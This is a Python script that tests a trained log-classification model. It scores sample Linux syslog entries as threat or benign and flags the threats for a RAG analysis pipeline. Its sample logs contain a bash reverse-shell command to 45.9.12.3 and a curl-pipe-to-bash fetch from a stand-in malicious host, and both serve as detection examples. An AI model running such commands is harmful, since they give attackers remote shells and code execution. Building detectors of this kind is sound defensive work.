"""
Log Classification Test
Test the trained model with user-provided logs
"""

import pandas as pd
import numpy as np
import joblib
from pathlib import Path

def classify_user_logs(logs):
    """Classify a list of log entries"""
    print("🔍 Classifying User-Provided Logs")
    print("="*40)
    
    # Find the most recent model
    models_dir = Path("models")
    model_files = list(models_dir.glob("quick_threat_model_*.joblib"))
    
    if not model_files:
        print("❌ No trained models found!")
        return
    
    latest_model = max(model_files, key=lambda x: x.stat().st_mtime)
    print(f"📥 Using model: {latest_model.name}")
    
    # Load model
    model_data = joblib.load(latest_model)
    model = model_data['model']
    vectorizer = model_data['vectorizer']
    optimal_threshold = model_data['optimal_threshold']
    
    print(f"🎯 Using threshold: {optimal_threshold:.3f}")
    print(f"📊 Analyzing {len(logs)} log entries...\n")
    
    # Transform logs
    X = vectorizer.transform(logs).toarray()
    
    # Make predictions
    y_prob = model.predict_proba(X)[:, 1]
    y_pred_default = model.predict(X)
    y_pred_optimal = (y_prob >= optimal_threshold).astype(int)
    
    # Display results
    print("🚨 = THREAT | ✅ = BENIGN")
    print("-" * 60)
    
    for i, log in enumerate(logs):
        prob = y_prob[i]
        pred_default = "🚨 THREAT" if y_pred_default[i] == 1 else "✅ BENIGN"
        pred_optimal = "🚨 THREAT" if y_pred_optimal[i] == 1 else "✅ BENIGN"
        
        # Determine confidence level
        if prob >= 0.8:
            confidence = "HIGH"
        elif prob >= 0.6:
            confidence = "MEDIUM"
        elif prob <= 0.2:
            confidence = "HIGH (Benign)"
        elif prob <= 0.4:
            confidence = "MEDIUM (Benign)"
        else:
            confidence = "LOW"
        
        print(f"\n{i+1:2d}. Log Entry:")
        print(f"    {log}")
        print(f"    Threat Probability: {prob:.3f} ({confidence} confidence)")
        print(f"    Default (0.5):      {pred_default}")
        print(f"    Optimal ({optimal_threshold:.3f}):      {pred_optimal}")
        
        # RAG recommendation
        if y_pred_optimal[i] == 1:
            print(f"    📤 RAG Action: SEND TO RAG PIPELINE for analysis")
        else:
            print(f"    ✅ RAG Action: SKIP - classify as benign")

def main():
    """Main function - you can modify this with your logs"""
    
    # Example logs - replace these with your actual logs
    test_logs = [
    "Oct 11 03:12:44 sshd[2023]: Failed password for invalid user guest from 185.24.55.10 port 44822 ssh2",
    "Oct 11 03:15:02 sudo: user root : TTY=pts/1 ; PWD=/tmp ; COMMAND=/bin/bash -i >& /dev/tcp/45.9.12.3/9001 0>&1",
    " Oct 11 03:20:18 kernel: Audit: type=1326 msg=audit(1731214818.321:634): comm=\"curl\" exe=\"/usr/bin/curl\" args=\"curl http://malicious.example.com/script.sh | bash\"",
    "Oct 11 04:05:03 useradd: new user: name=system_maint, UID=1008, GID=1008, home=/home/system_maint, shell=/bin/bash",
    "Oct 11 04:09:40 crond[900]: (root) CMD (/usr/local/bin/cleanup.sh)",
    "Oct 11 04:30:22 kernel: Initializing network interface eth0",
    "Oct 11 05:12:11 sshd[1760]: Accepted password for developer from 192.168.0.15 port 60321 ssh2",
    "Oct 11 06:02:47 su: (to root) admin on pts/0",
    "Oct 11 06:15:33 systemd[1]: Started Backup Service.",
    " Oct 11 06:22:11 kernel: Audit: type=1400 msg=audit(1731216131.654:742): apparmor=\"DENIED\" operation=\"open\" profile=\"/usr/sbin/nginx\" name=\"/etc/shadow\"",
]


    
    print("🧪 Testing Model with Sample Logs")
    print("Replace test_logs in main() with your actual logs!\n")
    
    classify_user_logs(test_logs)
    
    print(f"\n" + "="*60)
    print("💡 To test your own logs:")
    print("1. Edit the test_logs list in main() function")
    print("2. Add your log entries as strings")
    print("3. Run: python classify_logs.py")
    print("="*60)

if __name__ == "__main__":
    main()